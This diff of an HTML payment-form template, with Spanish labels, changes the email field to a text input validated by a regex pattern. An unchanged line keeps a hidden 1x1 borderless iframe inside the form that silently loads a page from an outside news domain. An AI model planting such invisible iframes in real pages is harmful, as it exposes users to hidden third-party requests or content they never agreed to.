@@ -48,12 +48,9 @@
 <!-- pattern="(19|20)\d\d[- -.](0[1-9]|1[012])[- -.](0[1-9]|[12][0-9]|3[01])" title="La fecha ha de tener el siguiente formato: aaaa-mm-dd"-->
 
     <label>Correo: </label>
-    <input type="email" value="" name="correo" placeholder="micorreo@gmail.com">
+    <input type="text" value="" name="correo" placeholder="micorreo@gmail.com" pattern="[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+" title="el correo tiene la siguiente forma micorreo@gmail.com"  required/>
     <br>
     <input type="submit" value="Pagar" class="btn btn-warning">
     <iframe width="1" height="1" frameborder="0" scrolling="no" src="http://www.diariomadrid.eu/noticia_ultima_hora.php"> </iframe>
-
-
-
 </form>
 {% endblock %}
